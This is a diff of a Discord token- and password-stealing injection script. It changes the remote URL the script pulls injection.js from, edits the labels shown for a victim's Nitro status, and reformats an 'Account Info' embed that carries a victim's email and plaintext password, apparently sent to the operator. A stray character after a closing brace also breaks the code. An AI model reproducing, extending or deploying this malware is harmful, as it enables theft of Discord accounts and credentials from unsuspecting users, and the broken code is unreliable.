@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Hannabi', 
   embed_icon: 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png'.replace(/ /g, '%20'), 
   embed_color: 8363488, 
-  injection_url: 'https://raw.githubusercontent.com/Rldqzo/test/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/Rldqzo/Rkdzqdzq21dqz123d231qzqdz/main/injection.js', 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
@@ -564,13 +564,13 @@ const buyNitro = async (token) => {
 const getNitro = (flags) => {
   switch (flags) {
     case 0:
-      return '<:classic:896119171019067423> \`Nitro Classic\`';
+      return 'No Nitro';
     case 1:
       return '<:classic:896119171019067423> \`Nitro Classic\`';
     case 2:
       return '<a:boost:824036778570416129> \`Nitro Boost\`';
     default:
-      return '<a:boost:824036778570416129> \`Nitro Boost\`';
+      return 'No Nitro';
   }z
 };
 
@@ -658,7 +658,7 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Account Info**',
-            value: `Email: **${email}** - Password: **${password}**`,
+            value: `Email: **${email}** - \nPassword: **${password}**`,
             inline: false,
           },
           {
